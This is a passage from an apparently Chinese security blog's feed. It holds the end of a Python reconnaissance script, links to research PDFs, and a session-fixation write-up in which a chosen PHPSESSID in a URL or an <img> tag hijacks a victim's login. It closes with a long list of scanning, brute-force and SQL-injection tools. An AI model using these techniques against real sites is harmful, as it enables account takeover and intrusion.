class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>domain <span class="token operator">=</span> domain    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">,</span>headers <span class="token operator">=</span> head <span class="token punctuation">)</span>        html <span class="token operator">=</span> r<span class="token punctuation">.</span>text        bs <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;div class="tab-pane fade in active" id="domain"'</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">'&lt;br>'</span> <span class="token punctuation">)</span>            domainc <span class="token operator">=</span> i<span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            domain_html <span class="token operator">=</span> <span class="token string">'&lt;pre>[{}]： {}&lt;/pre>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span> num<span class="token punctuation">,</span>domainc <span class="token punctuation">)</span>            html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span> domain_html <span class="token punctuation">)</span>        html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span>ip_cls <span class="token operator">=</span> IP<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>ip_html <span class="token operator">=</span> ip_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>cms_cls <span class="token operator">=</span> CMS<span class="token punctuation">(</span>url<span class="token punctuation">)</span>cms_html <span class="token operator">=</span> cms_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>domain_cls <span class="token operator">=</span> DOMAIN<span class="token punctuation">(</span> domain <span class="token punctuation">)</span>domain_html <span class="token operator">=</span> domain_cls<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>后续会写一个将每个子域名的<code>title</code>跑出来，以及把每个子域名的<code>c</code>段跑出来以及历史<code>ip</code>的标题等~ 希望我有生之年写的出来吧 啊哈哈哈</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python3 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安天365安全研究资料分享</title>
      <link href="/2018/12/24/an-tian-365-an-quan-yan-jiu-zi-liao-fen-xiang/"/>
      <url>/2018/12/24/an-tian-365-an-quan-yan-jiu-zi-liao-fen-xiang/</url>
      
        <content type="html"><![CDATA[<h3 id="第一期"><a href="#第一期" class="headerlink" title="第一期"></a>第一期</h3><p><a href="http://static.zybuluo.com/1kbfree/9mo8fotfnvksr18aezqbi56o/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC1%E6%9C%9F-2017-04.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h3><p><a href="http://static.zybuluo.com/1kbfree/9zmznh67hr67q3499vzixdxz/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC2%E6%9C%9F-2017-05.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第三期"><a href="#第三期" class="headerlink" title="第三期"></a>第三期</h3><p><a href="http://static.zybuluo.com/1kbfree/0acfwlpgdvko40odp216yy6h/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC3%E6%9C%9F-2017-06.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第四期"><a href="#第四期" class="headerlink" title="第四期"></a>第四期</h3><p><a href="http://static.zybuluo.com/1kbfree/dee75yevf5r7l2huq38y5033/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC4%E6%9C%9F-2017-07.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h3><p><a href="http://static.zybuluo.com/1kbfree/vfrddr8rgb7d79ncl7k5aj9l/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC5%E6%9C%9F201708.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第六期"><a href="#第六期" class="headerlink" title="第六期"></a>第六期</h3><p><a href="http://static.zybuluo.com/1kbfree/tnh4nyev4qp2zdu7jqtk8pfs/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC6%E6%9C%9F201709.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第七期"><a href="#第七期" class="headerlink" title="第七期"></a>第七期</h3><p><a href="http://static.zybuluo.com/1kbfree/g6rh2ih0ynjmi7aldih9syu2/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC7%E6%9C%9F20171028.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第八期"><a href="#第八期" class="headerlink" title="第八期"></a>第八期</h3><p><a href="http://static.zybuluo.com/1kbfree/fna1eezud966bcnw59iqlvb1/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC8%E6%9C%9F20171128.pdf" target="_blank" rel="noopener">阅读地址</a></p><h3 id="第九期"><a href="#第九期" class="headerlink" title="第九期"></a>第九期</h3><p><a href="http://static.zybuluo.com/1kbfree/3e7bib120fwlu998sxyjvwoh/%E3%80%8A%E5%AE%89%E5%A4%A9365%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E3%80%8B%E7%AC%AC9%E6%9C%9F20171228.pdf" target="_blank" rel="noopener">阅读地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资料分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie可控导致的漏洞</title>
      <link href="/2018/12/24/cookie-ke-kong-dao-zhi-de-lou-dong/"/>
      <url>/2018/12/24/cookie-ke-kong-dao-zhi-de-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、打开站点发现他有一个请求是这样的</p><p><img src="http://static.zybuluo.com/1kbfree/dr60uluzbcs2hex6kqt9bf1a/1.png" alt="1.png-200.5kB"></p><p>你可以操作<code>cookie</code>为任何值，那么好玩的来了~</p><p>首先假设<code>a</code>用户是受害者，然后我（攻击者）诱导<code>a</code>用户打开如下链接</p><pre><code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code></pre><p><img src="http://static.zybuluo.com/1kbfree/g4rdm8prblacgiadrd37qy6a/1.png" alt="1.png-155.1kB"></p><p>然后我（攻击者）在本地也打开</p><pre><code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code></pre><p><img src="http://static.zybuluo.com/1kbfree/ar9pro7zt5ppo9zve5d0n6gk/1.png" alt="1.png-200.9kB"></p><p>打开后就登录了，其实原理很简单，就是比如这里的系统是用<code>PHPSESSID</code>来验证用户信息的，但是这里<code>PHPSESSID</code>是可控的，所以攻击者可以把受害者的<code>PHPSESSID</code>修改为任何数，然后把自己的<code>PHPSESSID</code>也修改为受害者一样的值就可以登录他们的账号了，是不是很有意思。</p><h3 id="漏洞利用加深"><a href="#漏洞利用加深" class="headerlink" title="漏洞利用加深"></a>漏洞利用加深</h3><p>有一种方法可以让受害者莫名的中招，就比如<code>www.xxx.com</code>可以插入图片，那么我把图片地址改为<code>http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321</code>（也就是<code>&lt;img src=&#39;http://www.xxx.cn/web/index/weiqi?PHPSESSID=123321&#39;&gt;</code>）然后用户一打开<code>www.xxx.com</code>就会在后台加载这个<code>url</code>然后他的<code>cookie</code>就变成了<code>123321</code>，然后攻击者去修改自己的<code>cookie</code>为<code>123321</code>就可以登录他们的账号了。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gayhub上的工具集合</title>
      <link href="/2018/12/24/gayhub-shang-de-gong-ju-ji-he/"/>
      <url>/2018/12/24/gayhub-shang-de-gong-ju-ji-he/</url>
      
        <content type="html"><![CDATA[<h3 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h3><p><strong>Scanners Box</strong>是一个集合github平台上的安全行业从业者自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器，<strong>同时该仓库只收录各位网友自己编写的一般性开源扫描器，类似awvs、nmap、w3af等知名扫描工具不收录</strong>。</p><hr><h4 id="子域名枚举扫描器或爆破工具"><a href="#子域名枚举扫描器或爆破工具" class="headerlink" title="子域名枚举扫描器或爆破工具"></a>子域名枚举扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (lijiejie开发的一款使用广泛的子域名爆破枚举工具)</li><li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (猪猪侠开发的一款域名收集全面、精准的子域名枚举工具)</li><li><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举爆破工具以及地图位置标记)</li><li><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (提供web界面的在线子域名信息收集工具)</li><li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （高效精准的子域名爆破工具,同时也是扫描器中最常用的子域名API库)</li><li><a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">https://github.com/We5ter/GSDF</a> (基于谷歌SSL透明证书的子域名查询脚本)</li><li><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</li><li><a href="https://github.com/guelfoweb/knock" target="_blank" rel="noopener">https://github.com/guelfoweb/knock</a> (Knock子域名获取，可用于查找子域名接管漏洞)</li><li><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker" target="_blank" rel="noopener">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> （多方式收集目标子域名信息）</li><li><a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> (兄弟域名查询）</li><li><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a> (高效的子域名爆破工具)</li><li><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a> (一款高效的子域名爆破工具）</li><li><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a> (子域名枚举、探测工具。可用于子域名接管漏洞探测)</li><li><a href="https://github.com/evilsocket/dnssearch" target="_blank" rel="noopener">https://github.com/evilsocket/dnssearch</a> (一款子域名爆破工具)</li><li><a href="https://github.com/reconned/domained" target="_blank" rel="noopener">https://github.com/reconned/domained</a> (可用于子域名收集的一款工具）</li><li><a href="https://github.com/bit4woo/Teemo" target="_blank" rel="noopener">https://github.com/bit4woo/Teemo</a> (域名收集及枚举工具)</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> (邮箱、服务器信息收集及子域名枚举工具）</li><li><a href="https://github.com/swisskyrepo/Subdomino" target="_blank" rel="noopener">https://github.com/swisskyrepo/Subdomino</a> (子域名枚举，端口扫描，服务存活确认）</li><li><a href="https://github.com/nmalcolm/Inventus" target="_blank" rel="noopener">https://github.com/nmalcolm/Inventus</a> (通过爬虫实现的子域名收集工具）</li><li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a> (快速子域枚举工具)</li><li><a href="https://github.com/jonluca/Anubis" target="_blank" rel="noopener">https://github.com/jonluca/Anubis</a> （子域名枚举及信息搜集工具）</li><li><a href="https://github.com/n4xh4ck5/N4xD0rk" target="_blank" rel="noopener">https://github.com/n4xh4ck5/N4xD0rk</a> (子域名查询工具)</li><li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a> (一款高效的子域名爆破工具)</li><li><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a> (基于AsyncIO协程以及非重复字典的子域名爆破工具)</li><li><a href="https://github.com/giovanifss/Dumb" target="_blank" rel="noopener">https://github.com/giovanifss/Dumb</a> (快速而灵活的子域名爆破工具)</li><li><a href="https://github.com/UnaPibaGeek/ctfr" target="_blank" rel="noopener">https://github.com/UnaPibaGeek/ctfr</a> (通过域名透明证书记录获取子域名)</li><li><a href="https://github.com/caffix/amass" target="_blank" rel="noopener">https://github.com/caffix/amass</a> (Go语言开发的子域名枚举工具)</li><li><a href="https://github.com/Ice3man543/subfinder" target="_blank" rel="noopener">https://github.com/Ice3man543/subfinder</a> (继承于sublist3r项目的模块化体系结构，一个强劲的子域名枚举工具)</li></ul><h4 id="数据库类漏洞扫描器或爆破工具"><a href="#数据库类漏洞扫描器或爆破工具" class="headerlink" title="数据库类漏洞扫描器或爆破工具"></a>数据库类漏洞扫描器或爆破工具</h4><ul><li><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</li><li><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</li><li><a href="https://github.com/LoRexxar/Feigong" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong</a> （针对各种情况自由变化的MySQL注入脚本）</li><li><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</li><li><a href="https://github.com/Neohapsis/bbqsql" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql</a> （SQL盲注利用框架）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> （攻击SQLSERVER的Powershell脚本框架）</li><li><a href="https://github.com/WhitewidowScanner/whitewidow" target="_blank" rel="noopener">https://github.com/WhitewidowScanner/whitewidow</a> (一款数据库扫描器)</li><li><a href="https://github.com/stampery/mongoaudit" target="_blank" rel="noopener">https://github.com/stampery/mongoaudit</a> (MongoDB审计及渗透工具）</li><li><a href="https://github.com/torque59/Nosql-Exploitation-Framework" target="_blank" rel="noopener">https://github.com/torque59/Nosql-Exploitation-Framework</a> (NoSQL扫描/爆破工具）</li><li><a href="https://github.com/missDronio/blindy" target="_blank" rel="noopener">https://github.com/missDronio/blindy</a> (MySQL盲注爆破工具）</li><li><a href="https://github.com/fengxuangit/Fox-scan" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan</a> (基于SQLMAP的主动和被动资源发现的漏洞扫描工具）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> (用于SQL Server审计的powershell脚本）</li><li><a href="https://github.com/JohnTroony/Blisqy" target="_blank" rel="noopener">https://github.com/JohnTroony/Blisqy</a> （用于http header中的时间盲注爆破工具，仅针对MySQL/MariaDB）</li><li><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a> (Java 编写的SQL注入工具)</li><li><a href="https://github.com/Hadesy2k/sqliv" target="_blank" rel="noopener">https://github.com/Hadesy2k/sqliv</a> (基于搜索引擎的批量SQL注入漏洞扫描器）</li><li><a href="https://github.com/s0md3v/sqlmate" target="_blank" rel="noopener">https://github.com/s0md3v/sqlmate</a> (在sqlmap基础上增加了目录扫描、hash爆破等功能)</li><li><a href="https://github.com/m8r0wn/enumdb" target="_blank" rel="noopener">https://github.com/m8r0wn/enumdb</a> (MySQL以及MSSQL爆破脱裤工具）</li><li><a href="https://github.com/9tail123/wooscan" target="_blank" rel="noopener">https://github.com/9tail123/wooscan</a> (批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)</li></ul><h4 id="弱口令-弱用户名扫描器或爆破工具"><a href="#弱口令-弱用户名扫描器或爆破工具" class="headerlink" title="弱口令/弱用户名扫描器或爆破工具"></a>弱口令/弱用户名扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</li><li><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> （对各类服务进行弱口令检测的脚本)</li><li><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</li><li><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （Go写的协程版的ssh\redis\mongodb弱口令破解工具）</li><li><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a> (暴力破解字典建立工具)</li><li><a href="https://github.com/shengqi158/weak_password_detect" target="_blank" rel="noopener">https://github.com/shengqi158/weak_password_detect</a> (多线程探测弱口令）</li><li><a href="https://github.com/s0md3v/Blazy" target="_blank" rel="noopener">https://github.com/s0md3v/Blazy</a> (支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器）</li><li><a href="https://github.com/MooseDojo/myBFF" target="_blank" rel="noopener">https://github.com/MooseDojo/myBFF</a> (对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本)</li></ul><h4 id="物联网设备识别工具或扫描器"><a href="#物联网设备识别工具或扫描器" class="headerlink" title="物联网设备识别工具或扫描器"></a>物联网设备识别工具或扫描器</h4><ul><li><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</li><li><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</li><li><a href="https://github.com/googleinurl/RouterHunterBR" target="_blank" rel="noopener">https://github.com/googleinurl/RouterHunterBR</a> （路由器设备漏洞扫描利用)</li><li><a href="https://github.com/scu-igroup/telnet-scanner" target="_blank" rel="noopener">https://github.com/scu-igroup/telnet-scanner</a> (Telnet服务密码撞库)</li><li><a href="https://github.com/viraintel/OWASP-Nettacker" target="_blank" rel="noopener">https://github.com/viraintel/OWASP-Nettacker</a> (自动化信息搜集及渗透测试工具，比较适用于IoT扫描)</li><li><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a> (嵌入式设备漏洞扫描及利用工具)</li></ul><h4 id="反射型或DOM-Based-XSS扫描器"><a href="#反射型或DOM-Based-XSS扫描器" class="headerlink" title="反射型或DOM-Based XSS扫描器"></a>反射型或DOM-Based XSS扫描器</h4><ul><li><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （一款XSS扫描器,可暴力注入参数）</li><li><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (小型XSS扫描器,也可检测CRLF、XSS、点击劫持的)</li><li><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</li><li><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描XSS的python脚本）</li><li><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件）</li><li><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> (使用命令行进行XSS批量检测)</li><li><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a> (可识别并绕过WAF的XSS扫描工具)</li><li><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> (支持GET、POST方式的高效XSS扫描器）</li></ul><h4 id="企业资产管理或信息泄露搜集工具"><a href="#企业资产管理或信息泄露搜集工具" class="headerlink" title="企业资产管理或信息泄露搜集工具"></a>企业资产管理或信息泄露搜集工具</h4><ul><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</li><li><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a>  (Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</li><li><a href="https://github.com/Ekultek/Zeus-Scanner" target="_blank" rel="noopener">https://github.com/Ekultek/Zeus-Scanner</a> (集成化的综合搜索引擎，能够抓取被搜索引擎隐藏的url,并交由sqlmap、nmap扫描）</li><li><a href="https://github.com/0xbug/Biu-framework" target="_blank" rel="noopener">https://github.com/0xbug/Biu-framework</a> (企业内网基础服务安全扫描框架)</li><li><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a> (github Repo信息搜集工具)</li><li><a href="https://github.com/shengqi158/svnhack" target="_blank" rel="noopener">https://github.com/shengqi158/svnhack</a> （<code>.svn</code>文件夹泄漏利用工具）</li><li><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a> (GitHub敏感信息扫描工具)</li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a> (企业资产、敏感信息GitHub泄露监控系统）</li><li><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a> （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具）</li><li><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a> （github敏感信息搜索工具）</li><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (<code>.git</code>文件夹泄漏利用工具) </li><li><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a> (GitHub敏感信息扫描工具,包括检测commit等)</li><li><a href="https://github.com/1N3/Goohak" target="_blank" rel="noopener">https://github.com/1N3/Goohak</a> （自动化对指定域名进行Google hacking搜索并收集信息）</li><li><a href="https://github.com/UKHomeOffice/repo-security-scanner" target="_blank" rel="noopener">https://github.com/UKHomeOffice/repo-security-scanner</a> (用于搜索git commit中的敏感信息，例如密码、私钥等的客户端工具)</li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a> (Github敏感信息泄露扫描)</li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a> (Github泄露巡航工具)</li><li><a href="https://github.com/1N3/BlackWidow" target="_blank" rel="noopener">https://github.com/1N3/BlackWidow</a> (Web站点信息搜集工具，包括邮箱、电话等信息）</li><li><a href="https://github.com/anshumanbh/git-all-secrets" target="_blank" rel="noopener">https://github.com/anshumanbh/git-all-secrets</a> (集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)</li><li><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a> (可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)</li><li><a href="https://github.com/VKSRC/Github-Monitor" target="_blank" rel="noopener">https://github.com/VKSRC/Github-Monitor</a> (由vipkid SRC开发的Github信息泄漏监控系统)</li></ul><h4 id="webshell检测或木马分析工具"><a href="#webshell检测或木马分析工具" class="headerlink" title="webshell检测或木马分析工具"></a>webshell检测或木马分析工具</h4><ul><li><a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a> （一款简单的webshell检测工具)</li><li><a href="https://github.com/Tencent/HaboMalHunter" target="_blank" rel="noopener">https://github.com/Tencent/HaboMalHunter</a> （哈勃分析系统，linux系统病毒分析及安全检测）</li><li><a href="https://github.com/PlagueScanner/PlagueScanner" target="_blank" rel="noopener">https://github.com/PlagueScanner/PlagueScanner</a> (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎)</li><li><a href="https://github.com/nbs-system/php-malware-finder" target="_blank" rel="noopener">https://github.com/nbs-system/php-malware-finder</a> (一款高效率PHP-webshell扫描工具)</li><li><a href="https://github.com/emposha/PHP-Shell-Detector/" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector/</a> (测试效率高达99%的webshell检测工具)</li><li><a href="https://github.com/erevus-cn/scan_webshell" target="_blank" rel="noopener">https://github.com/erevus-cn/scan_webshell</a> (一款简洁的Webshell扫描工具）</li><li><a href="https://github.com/emposha/Shell-Detector" target="_blank" rel="noopener">https://github.com/emposha/Shell-Detector</a> （Webshell扫描工具，支持php/perl/asp/aspx webshell扫描)</li><li><a href="https://github.com/m4rco-/dorothy2" target="_blank" rel="noopener">https://github.com/m4rco-/dorothy2</a> (一款木马、僵尸网络分析框架）</li><li><a href="https://github.com/droidefense/engine" target="_blank" rel="noopener">https://github.com/droidefense/engine</a> (高级安卓木马病毒分析框架）</li></ul><h4 id="内网渗透或扫描工具"><a href="#内网渗透或扫描工具" class="headerlink" title="内网渗透或扫描工具"></a>内网渗透或扫描工具</h4><ul><li><a href="https://github.com/lcatro/network_backdoor_scanner" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner</a> （基于网络流量的内网探测框架）</li><li><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter</a> （调用 Windows API 枚举用户登录信息）</li><li><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="noopener">https://github.com/BlackHole1/WebRtcXSS</a> （自动化利用XSS入侵内网）</li></ul><h4 id="中间件扫描器或指纹识别工具"><a href="#中间件扫描器或指纹识别工具" class="headerlink" title="中间件扫描器或指纹识别工具"></a>中间件扫描器或指纹识别工具</h4><ul><li><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</li><li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</li><li><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</li><li><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （SSL类型识别)</li><li><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (Web指纹识别)</li><li><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (Web应用指纹识别)</li><li><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</li><li><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (基于Masscan和Zmap的网络扫描器)</li><li><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</li><li><a 